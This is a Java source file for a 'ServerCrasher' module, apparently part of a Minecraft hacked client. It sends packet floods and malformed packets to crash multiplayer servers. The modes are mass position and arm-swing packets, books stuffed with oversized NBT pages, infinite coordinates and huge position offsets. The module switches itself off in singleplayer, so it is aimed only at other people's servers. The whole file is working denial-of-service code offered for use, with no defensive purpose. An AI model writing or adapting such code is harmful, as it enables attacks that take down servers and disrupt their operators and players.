package com.mentalfrostbyte.jello.module.impl.world;


import com.mentalfrostbyte.Client;
import com.mentalfrostbyte.jello.event.impl.player.EventUpdate;
import com.mentalfrostbyte.jello.managers.util.notifs.Notification;
import com.mentalfrostbyte.jello.module.Module;
import com.mentalfrostbyte.jello.module.data.ModuleCategory;
import com.mentalfrostbyte.jello.module.settings.impl.ModeSetting;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundNBT;
import net.minecraft.nbt.ListNBT;
import net.minecraft.nbt.StringNBT;
import net.minecraft.network.play.client.CAnimateHandPacket;
import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
import net.minecraft.network.play.client.CPlayerPacket;
import net.minecraft.util.Hand;
import team.sdhq.eventBus.annotations.EventTarget;

public class ServerCrasher extends Module {
	public int i;

	public ServerCrasher() {
		super(ModuleCategory.WORLD, "ServerCrasher", "Crashes a server");
		this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
	}

	@Override
	public void onEnable() {
		this.i = 0;
	}

	@EventTarget
	public void onUpdate(EventUpdate ignored) {
		if (!this.isEnabled()) return;

		if (mc.isSingleplayer()) {
			this.toggle();
			return;
		}

		String mode = this.getStringSettingValueByName("Mode");
		switch (mode) {
			case "Flying Enabled":
				double x = mc.player.getPosX();
				double y = mc.player.getPosY();
				double z = mc.player.getPosZ();
				double yOffset = 0.0, zOffset;

				for (int i = 0; i < 50000; i++) {
					zOffset = i * 7;
					mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(x - zOffset, y + yOffset, z + zOffset, false));
				}

				Client.getInstance().notificationManager
						.send(new Notification("ServerCrasher", "Trying to crash the server.."));
				this.toggle();
				break;
			case "Vanilla":
				if (this.i++ >= 10) {
					this.i = 0;

					for (int __ = 0; __ < 100000; __++) {
						mc.getConnection().sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
					}

					Client.getInstance().notificationManager
							.send(new Notification("ServerCrasher", "Trying to crash the server.."));
				}
				break;
			case "Book":
				ItemStack bookItem = new ItemStack(Items.BOOK);
				ListNBT listNBT = new ListNBT();
				CompoundNBT nbt = new CompoundNBT();
				StringBuilder str = new StringBuilder();

				for (int i = 0; i < 5000; i++) {
					char chr = (char) Math.round(32.0F + (float) Math.random() * 94.0F);
					str.append(chr);
				}

				for (int var27 = 0; var27 < 50; var27++) {
					StringNBT var22 = new StringNBT(str.toString());
					listNBT.add(var22);
				}

				nbt.putString("author", "LeakedPvP");
				nbt.putString("title", "Sigma");
				nbt.put("pages", listNBT);
				bookItem.setTagInfo("pages", listNBT);
				bookItem.setTag(nbt);

				for (int __ = 0; __ < 100; __++) {
					try {
						mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, bookItem));
					} catch (Exception var23) {
					}
				}

				this.toggle();
				break;
			case "Infinity":
				mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
				Client.getInstance().notificationManager
						.send(new Notification("ServerCrasher", "Trying to crash the server.."));
				this.toggle();
				break;
			case "BrainFreeze":
				mc.getConnection()
						.sendPacket(
								new CPlayerPacket.PositionPacket(
										mc.player.getPosX() + 9999.0,
										mc.player.getPosY() + 9999.0,
										mc.player.getPosZ() + 9999.0,
										false
								)
						);
				mc.getConnection()
						.sendPacket(
								new CPlayerPacket.PositionPacket(
										mc.player.getPosX(),
										mc.player.getBoundingBox().minY,
										mc.player.getPosZ() + 9999.0,
										mc.player.isOnGround()
								)
						);
				if (this.i++ >= 200) {
					this.toggle();
					Client.getInstance().notificationManager
							.send(new Notification("ServerCrasher", "Trying to crash the server.."));
				}
		}
	}
}
